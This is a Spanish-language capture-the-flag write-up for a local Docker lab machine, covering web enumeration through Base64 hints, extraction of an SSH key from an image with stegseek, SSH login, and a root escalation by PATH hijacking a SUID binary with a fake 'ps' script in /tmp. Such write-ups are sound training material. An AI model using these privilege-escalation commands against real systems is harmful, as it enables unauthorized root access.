# Write Up - Dr4g0n B4ll CTF

## Componentes del grupo

- Manex Tiraplegui Etulain
- Rubén Zubasti Aristu

---

## Guía de solución de la máquina

### 1. Iniciar la máquina

Lanzamos el contenedor con el script:

```bash
./start.sh
```

### 2. Acceder al servidor web

Abrimos el navegador y accedemos a:

```
http://localhost:8080
```

### 3. Enumeración del servidor web

#### 3.1. Página principal

En la página principal encontramos una imagen de Goku. Sin embargo, al revisar el **código fuente**, encontramos un texto codificado en Base64 (múltiples veces):

```bash
echo VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 | base64 -d | base64 -d | base64 -d
```

**Resultado:** `DRAGON BALL` → Pista 1

#### 3.2. Robots.txt

Al acceder a `/robots.txt`, encontramos otro mensaje en Base64:

```bash
echo eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI= | base64 -d
```

**Resultado:** `you find the hidden dir` -> Pista 2

#### 3.3. Directorio oculto

Con las dos pistas damos por hecho que existe el directorio `/DRAGON BALL/` y encontramos:
- `secret.txt` con nombres de directorios (es inútil, solo es para despistar)
- Directorio `Vulnhub/`, accedemos a este y vemos:
  - `flag.jpg` - Spoiler: Es una imagen con datos ocultos ;)
  - `login.html` - Página de login con pista del usuario

### 4. Esteganografía

Descargamos la imagen y usamos **stegseek** para extraer datos ocultos.

**Prerequisito**: Asegurate de tener `rockyou.txt` en `/usr/share/wordlists/rockyou.txt`. Si no lo tienes, descárgalo desde [SecLists - rockyou.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz).


Ejecuta stegseek para encontrar la contraseña:

```bash
wget http://localhost:8080/DRAGON%20BALL/Vulnhub/flag.jpg
stegseek flag.jpg
```
o si prefieres descargar la imagen:

```bash
stegseek flag.jpg
```

Stegseek encontrará automáticamente la contraseña y extraerá los datos a `flag.jpg.out`:



Renombra el archivo extraído para facilitar su uso y cambia sus permisos:

```bash
mv flag.jpg.out id_rsa
chmod 600 id_rsa
```

Alternativamente, si conoces la contraseña , usa **steghide** directamente (stegseek te dice cuál es, puedes usar steghide después, aunque no es necesario ya que stegseek ya saca la información oculta):

```bash
steghide extract -sf flag.jpg -p "<contraseña>"
```

**Resultado:** Se extrae una clave privada SSH (`id_rsa`).

### 5. Acceso SSH

#### 5.1. Encontrar el usuario

En `login.html` encontramos el nombre de usuario: **xmen**

#### 5.2. Obtener la IP del contenedor

Para conectarnos por SSH, necesitamos la IP del contenedor. La obtenemos con:

```bash
docker network inspect web-lab_internal_net
```

Buscamos la IP asignada al contenedor `web-lab-machine1-1` (normalmente `172.x.0.2`).

#### 5.3. Conectar por SSH

Nos aseguramos de que la clave tiene los permisos necesarios y conectamos por ssh:

```bash
chmod 600 id_rsa
ssh -i id_rsa xmen@<IP_OBJETIVO>
```

### 6. Flag de usuario

Una vez dentro, encontramos la flag de usuario:

```bash
cat ~/user.txt
```

**Flag:** `ssi{...}`

### 7. Escalada de privilegios

#### 7.1. Explorar el home

En el directorio home del usuario encontramos una carpeta `script/` con archivos interesantes:

```bash
cd ~/script/
ls -la
```

Vemos un binario `shell` con permisos SUID de root y un archivo `demo.c` con el código fuente.

#### 7.2. Analizar el binario

```bash
cat demo.c
./shell
```

El binario ejecuta `ps` sin usar ruta absoluta, lo que permite **PATH hijacking**.

#### 7.3. Explotar PATH hijacking

```bash
cd /tmp
echo "/bin/bash" > ps
chmod +x ps
export PATH=/tmp:$PATH
which ps  # Verifica que usa /tmp/ps
```

#### 7.4. Ejecutar el exploit

```bash
~/script/shell
```

Ahora somos **root**.

### 8. Flag de root

```bash
cd /root
cat root.txt
```

**Flag:** `ssi{...}`

---

## Resumen de técnicas utilizadas

| Fase | Técnica |
|------|---------|
| Enumeración web | Análisis de código fuente, robots.txt |
| Criptografía | Decodificación Base64 |
| Esteganografía | Stegseek/Steghide |
| Acceso inicial | SSH con clave privada |
| Escalada de privilegios | PATH hijacking |
